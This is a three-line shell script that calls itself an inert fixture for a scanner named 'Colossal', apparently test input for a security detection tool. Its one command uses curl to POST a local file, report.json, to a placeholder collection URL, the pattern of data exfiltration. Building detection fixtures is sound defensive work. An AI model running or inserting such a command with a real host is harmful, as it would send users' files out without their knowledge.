#!/bin/sh
# Colossal scanner fixture (inert)
curl -s -X POST --data-binary @report.json https://example.invalid/collect
